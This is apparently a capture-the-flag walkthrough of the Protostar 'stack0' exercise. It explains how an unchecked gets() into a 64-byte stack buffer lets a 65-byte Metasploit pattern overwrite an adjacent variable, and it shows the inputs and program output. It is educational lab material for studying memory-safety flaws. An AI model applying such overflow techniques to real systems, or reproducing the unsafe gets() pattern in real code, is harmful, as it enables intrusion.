The first walkthrough is a very simple example of a buffer overrun and may as well be straight out of the OWASP buffer overrun example.

In the following line of code an int _modified_ is created first in the stack and a char buffer of 64 is created as well.

```
  volatile int modified;
  char buffer[64];
```


The stack, at this point should look something like

```
|---- buffer  ----|--  modified  --|
|---- 64bytes ----|-- value of 0 --|
```

When the _gets_ function is called a few lines later
```
modified = 0;
gets(buffer);
```

there are no checks on the input which allows more than 64 bytes of data to overflow the stack into
the address space used my modified

```
|---- buffer  ----|--   modified   --|
|more than 64by-> | -> tes of data --|
```


Using Metsaploit's Pattern Generator to test this, I first generated a 64 byte string as buffer input

```
﻿./pattern_create.rb 64
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A
```

The subsequent output of the application doesn't "capture the flag"
```
﻿user@protostar:/opt/protostar/bin$ ./stack0
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A
Try again?
```

A new pattern is generated at 65 Bytes which is expected to overflow the stack and present the opportunity to move on to the next exercise.

```
﻿./pattern_create.rb 65
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac
```

```
﻿user@protostar:/opt/protostar/bin$ ./stack0
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac
you have changed the 'modified' variable
```

Success!  Move on to [Stack1](../stack1/)
